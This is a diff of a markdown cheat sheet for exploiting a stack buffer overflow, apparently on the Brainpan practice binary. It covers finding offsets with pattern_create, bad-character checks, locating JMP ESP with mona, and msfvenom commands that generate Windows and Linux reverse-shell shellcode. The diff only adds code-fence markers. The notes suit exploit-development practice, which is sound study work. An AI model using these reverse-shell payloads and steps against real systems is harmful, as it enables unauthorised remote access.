@@ -4,7 +4,7 @@
 **2. Cofirm overflow length, append "A" * length**  
 
 **3. Generate Offset to check EIP, ESP location**  
-```
+```shell
   /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length>
 
 	Record value on EIP, select ESP and click "Follow in Dump"  
@@ -17,20 +17,20 @@
 
 **5. Check bad characters after EIP. common bad characters are 0x00, 0x0A. Follow dump in ESP to check are there something missing after that.**
 Add code:
-
+```shell
 	badchar = [0x00]
 	for ch in range (0x00 , 0xFF+1):
 		if ch not in badchar:
 			<payload> += chr(ch)
-
+```
 **6. Find JMP ESP address in the system.**
 	JMP ESP = FFE4
-
+```shell
 	!mona jmp -r esp -cpb "\x00\x0A" << bad character
 
 	!mona modules
 	!mona find -s "\xff\xe4" -m brainpan.exe
-
+```
 	check the value of the address by naviate to it.
 	Set breakpoint
 	Change "B" in EIP to the address of JMP ESP << littile edian
@@ -41,10 +41,10 @@ Add code:
 
 **7. Add shellcode**
 	Add a few \x90 before shellcode to avoid shellcode being modify
-
+```shell
 	msfvenom -p windows/shell_reverse_tcp LHOST=<IP>LPORT=<PORT> EXITFUNC=thread -f <Code Format> -a x86 -platform windows -b "\x00"
 	msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP>LPORT=<PORT> EXITFUNC=thread -f <Code Format> -b "\x00"
-
+```
 **Bonus: Running out of shell code space?**
 Use the front of payload instead
 1. Is there any register points to the front of our payload? EAX, EDX?
